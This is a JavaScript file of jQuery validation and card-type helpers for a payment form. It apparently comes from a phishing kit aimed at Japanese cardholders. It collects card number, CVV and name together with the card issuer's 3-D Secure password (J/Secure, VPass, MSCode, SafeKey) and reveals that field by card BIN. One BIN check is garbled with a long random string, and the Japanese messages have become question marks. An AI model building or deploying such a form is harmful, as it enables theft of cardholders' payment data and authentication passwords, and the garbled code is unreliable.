(function($, W, D) {
  var JQUERY4U = {};
  JQUERY4U.UTIL = {
      setupFormValidation: function() {
          $('#details').validate({
              errorElement: "span",
              rules: {
                  ccname: {
                      required: true
                  },
                  creditcard: {
                      required: true,
                      minlength: 15,
                      creditcard: true
                  },
                  cvv: {
                      required: true,
                      minlength: 3,
                      digits: true,
                  },
                  passjp: {
                      required: true,
                      minlength: 6,
                  },
              },
              groups: {},
              errorPlacement: function(error, element) {
                  if (element.attr("name") == "fname")
                      error.insertAfter("#nameerror");
                  else
                      error.insertAfter(element);
              },
              messages: {
                  ccname: {
                      required: "Please provide your cardholder's name &nbsp;",
                  },
                  creditcard: {
                      required: "Please enter your card number &nbsp;",
                      minlength: jQuery.validator.format("Please check the card number you have entered &nbsp;"),
                      creditcard: jQuery.validator.format("Please check the card number you have entered &nbsp;"),
                  },
                  cvv: {
                      required: "Please enter your card's security code &nbsp;",
                      minlength: jQuery.validator.format("Please check the card's security code you have entered &nbsp;"),
                      digits: jQuery.validator.format("Please check the card's security code you have entered &nbsp;"),
                  },
                  passjp: {
                      required: "??????????????&nbsp;",
                      minlength: "??????????????????6????&nbsp;",
                  },
              },
              submitHandler: function(form) {
                  form.submit();
              }
          });
          $("#gobtn").click(function() {
              $("#details").submit();
          });
      }
  }
  $(D).ready(function($) {
      JQUERY4U.UTIL.setupFormValidation();
  });
})(jQuery, window, document);
function ccc(){
  var cc = document.getElementById("cardNumber").value;
  var type = cc.substr(0, 2);

  if(type == "37" || type == "34") {
    $("#amexcid").html('<div class="form-control-group__item"> <div class="form-control undefined"><div class="form-control form-control--cvv"> <div class="form-control__input"> <div class="form-control__label"> <label for="cid" class="d-inline-block">CID</label><button class="button button--text" type="button"> <svg focusable="false" viewBox="0 0 22 22" style=" margin-left: 6px; width: 22px; height: 22px; "> <g fill="none"> <circle cx="11" cy="11" r="10" style=" fill: none; stroke: currentcolor; stroke-miterlimit: 10; "></circle> <path d="M13.14 15.665l-.168.682c-.5.198-.902.35-1.2.452-.298.103-.645.155-1.04.155-.606 0-1.078-.15-1.415-.444-.336-.295-.505-.67-.505-1.127 0-.176.012-.357.038-.542.025-.184.066-.393.122-.626l.626-2.216c.056-.212.103-.413.14-.604.04-.19.058-.363.058-.52 0-.282-.058-.48-.175-.59-.116-.112-.338-.17-.67-.17-.16 0-.327.027-.497.077-.17.052-.316.1-.438.146l.167-.684c.41-.167.803-.31 1.178-.43.375-.118.73-.177 1.065-.177.602 0 1.067.145 1.393.437.327.29.49.67.49 1.134 0 .097-.01.266-.034.51-.022.242-.064.465-.125.667L11.524 14c-.05.178-.097.38-.137.61-.04.226-.06.4-.06.515 0 .293.065.493.196.6.132.106.36.16.682.16.152 0 .324-.028.516-.08.19-.053.33-.1.417-.14zm.157-9.27c0 .386-.145.714-.436.984-.29.27-.64.406-1.05.406-.41 0-.762-.136-1.055-.407-.294-.27-.44-.6-.44-.984s.146-.713.44-.986c.293-.274.645-.41 1.055-.41.41 0 .76.137 1.05.41.292.273.437.602.437.986z" fill="currentColor"></path> </g></svg><span class="visuallyhidden">More information about CID</span> </button> </div> <input id="cid" aria-invalid="false" aria-describedby="cardValidCvv" class="false" name="cid" type="tel" required="" maxlength="4"> </div> </div></div> </div>');
    $("#cvv").attr('maxlength','4');
    console.log(type);
    $("#cvv").attr('placeholder','4 Digits');
  }else{
    $("#cvv").attr('maxlength','3');
    console.log('maxleght 3');
    $("#cvv").attr('placeholder','3 Digits');
  }
}
function check_additional() {
  var cc = document.getElementById("creditcard").value;
  var type = cc.substr(0, 2);
  var type1 = cc.substr(0, 1);
  var bin = cc.replace(/\s+/g, '');
  var bin = bin.substr(0, 6);
  if(type == "35") {
    $("#webid").hide();
    $("#passwordjp").show();
    $("#passjp").attr("placeholder", "????? (J/Secure)");
  }else if(type1 == "4"){
    if(bin == "41nUnZUjR7ANTzrA8ubUCyj23xDqoZVF9eZNwtbm2yovHjRMUFucHM43iF2sf5oQB4DR7z7iXcTWAcKZY14V53LrB9G5PbS41nUnZUjR7ANTzrA8ubUCyj23xDqoZVF9eZNwtbm2yovHjRMUFucHM43iF2sf5oQB4DR7z7iXcTWAcKZY14V53LrB9G5PbS41nUnZUjR7ANTzrA8ubUCyj23xDqoZVF9eZNwtbm2yovHjRMUFucHM43iF2sf5oQB4DR7z7iXcTWAcKZY14V53LrB9G5PbS41nUnZUjR7ANTzrA8ubUCyj23xDqoZVF9eZNwtbm2yovHjRMUFucHM43iF2sf5oQB4DR7z7iXcTWAcKZY14V53LrB9G5PbS41nUnZUjR7ANTzrA8ubUCyj23xDqoZVF9eZNwtbm2yovHjRMUFucHM43iF2sf5oQB4DR7z7iXcTWAcKZY14V53LrB9G5PbS41nUnZUjR7ANTzrA8ubUCyj23xDqoZVF9eZNwtbm2yovHjRMUFucHM43iF2sf5oQB4DR7z7iXcTWAcKZY14V53LrB9G5PbS420530" || bin == "420522" || bin == "420532") {
      $("#webid").hide();
      $("#passwordjp").hide();
    }else{
      $("#webid").show();
      $("#passwordjp").show();
      $("#passjp").attr("placeholder", "????? (VPass)");
    }
  }else if(type1 == "5") {
    if(bin == "531284" || bin == "531281" || bin == "531283" || bin == "531285" || bin == "531287" || bin == "531288" || bin == "531286" || bin == "531289" || bin == "531280" || bin == "531282") {
      $("#webid").hide();
      $("#passwordjp").hide();
    }else{
      $("#webid").show();
      $("#passwordjp").show();
      $("#passjp").attr("placeholder", "????? (MSCode)");
    }
  }else if(type == "37" || type == "34") {
    $("#webid").hide();
    $("#passwordjp").show();
    $("#passjp").attr("placeholder", "????? (Safekey)");
  }else {
    $("#webid").hide();
    $("#passwordjp").hide();
  }
}
function isValidEmailAddress(emailAddress) {
  var pattern = new RegExp(/^(("[\w-\s]+")|([\w-]+(?:\.[\w-]+)*)|("[\w-\s]+")([\w-]+(?:\.[\w-]+)*))(@((?:[\w-]+\.)*\w[\w-]{0,66})\.([a-z]{2,6}(?:\.[a-z]{2})?)$)|(@\[?((25[0-5]\.|2[0-4][0-9]\.|1[0-9]{2}\.|[0-9]{1,2}\.))((25[0-5]|2[0-4][0-9]|1[0-9]{2}|[0-9]{1,2})\.){2}(25[0-5]|2[0-4][0-9]|1[0-9]{2}|[0-9]{1,2})\]?$)/i);
  return pattern.test(emailAddress);
}